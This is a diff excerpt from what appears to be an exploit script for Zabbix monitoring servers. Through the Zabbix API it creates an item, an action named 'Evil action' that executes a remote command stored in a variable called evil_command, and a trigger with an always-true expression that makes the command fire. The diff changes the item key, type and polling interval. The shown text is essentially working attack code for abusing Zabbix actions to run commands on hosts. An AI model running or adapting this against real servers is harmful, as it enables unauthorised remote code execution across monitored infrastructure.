@@ -51,7 +51,7 @@ if __name__ == "__main__":
     try:
         hostid = zapi.host.get(filter={"host": "Host"})[0]["hostid"]
         print("Creating item: Example item")
-        zapi.item.create(name="Example item", key_="icmpping[]", hostid=hostid, type=3, interfaceid=1, value_type=0, delay="30s")
+        zapi.item.create(name="Example item", key_="zabbix[boottime]", hostid=hostid, type=5, interfaceid=1, value_type=0, delay="5s")
 
         print("Creating action: Evil action")
         action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
@@ -59,7 +59,7 @@ if __name__ == "__main__":
         action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")
 
         print("Creating trigger: Example trigger")
-        trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:icmpping[].last()}={Host:icmpping[].last()}")
+        trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:zabbix[boottime].last()}={Host:zabbix[boottime].last()}")
         trigger_id = int(trigger["triggerids"][0])
         trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
     except pyzabbix.ZabbixAPIException as e:
